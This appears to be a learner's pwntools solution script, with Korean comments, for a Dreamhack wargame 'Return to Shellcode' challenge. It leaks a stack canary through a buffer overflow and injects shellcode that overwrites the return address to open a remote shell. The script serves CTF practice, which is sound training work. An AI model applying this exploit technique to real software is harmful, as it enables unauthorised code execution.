# https://dreamhack.io/wargame/challenges/352/
# dreamhack Return to Shellcode
# essential configuration(pwndbg / pwntools) 세팅 잘되었나 확인하기

from pwn import *
def slog(n, m): return success(": ".join([n, hex(m)]))

p = remote("host3.dreamhack.games", 23611)
# p = process("./r2s")
context.arch = "amd64"

# [1] Get information about buf
p.recvuntil(b"buf: ")
# 문제에서 준 buf 주소
buf = int(p.recvline()[:-1], 16)
slog("Address of buf", buf)

p.recvuntil(b"$rbp: ")
#buf 시작위치에서 sfp 위치까지 (RET위치 아래. 이번 프레임 EBP값)
buf2sfp = int(p.recvline().split()[0])
buf2cnry = buf2sfp - 8

slog("buf <=> sfp", buf2sfp)
slog("buf <=> canary", buf2cnry)

# p.recvuntil(b"Input: ")
# code = b"A"*(0x58+1)
# p.send(code)

# [2] Leak canary value
#널바이트 채워줘야 디 값 출력됨. 카나리 리틀엔디언이라 00이 맨 앞에
payload = b"A"*(buf2cnry + 1)  # (+1) because of the first null-byte
p.sendafter(b"Input:", payload)
p.recvuntil(payload)
cnry = u64(b"\x00"+p.recvn(7))
slog("Canary", cnry)

# [3] Exploit
sh = asm(shellcraft.sh())
# cnry 값에 00 포함이니까 그대로 0x58개 넣고 카나리 넣어주면 됨
payload = sh.ljust(buf2cnry, b"A") + p64(cnry) + b"B"*0x8 + p64(buf)
# gets() receives input until "\n" is received
p.sendlineafter("Input:", payload)
p.interactive()